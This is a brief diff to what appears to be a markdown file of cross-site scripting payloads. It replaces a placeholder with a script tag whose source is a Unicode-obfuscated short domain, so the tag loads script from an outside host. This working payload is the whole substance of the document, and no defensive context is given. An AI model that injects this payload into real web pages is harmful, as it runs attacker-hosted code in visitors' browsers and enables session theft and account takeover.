@@ -1,7 +1,7 @@
 # XSS Payload
 ###
 ```
-lol
+<script/src=//Ǌ.₨></script>
 ```
 ###
 ```
